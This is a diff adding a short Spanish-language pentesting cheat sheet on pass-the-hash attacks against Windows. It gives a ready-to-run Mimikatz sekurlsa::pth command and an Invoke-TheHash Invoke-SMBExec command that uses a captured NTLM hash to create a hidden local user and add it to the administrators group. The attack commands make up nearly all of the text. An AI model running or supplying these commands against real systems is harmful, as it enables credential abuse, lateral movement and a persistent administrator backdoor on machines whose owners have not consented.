@@ -1,0 +1,22 @@
+Si encontramos un hash NTLM podemos hacer uso del mismo aprovechando las facilidades que ofrecen los SO para correr servicios sin tener que poner la contraseña una y otra vez
+
+
+####################################WINDOWS
+#####Pass the hash con Mimikatz:
+requerimos el hash NTLM o RC4
+User
+Dominio
+mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<dominio o nombre del host> /run:<.exe a ejecutar>" exit
+
+#####PTH con Powershell & Invoke-TheHash:
+Target - Hostname or IP address of the target.
+Username - Username to use for authentication.
+Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
+Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
+Command - command to run after connection
+https://github.com/Kevin-Robertson/Invoke-TheHash
+Import-Module .\Invoke-TheHash.psd1
+
+Invoke-SMBExec -Target <ip/hostname> -Domain <domain> -Username <username> -Hash <hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+
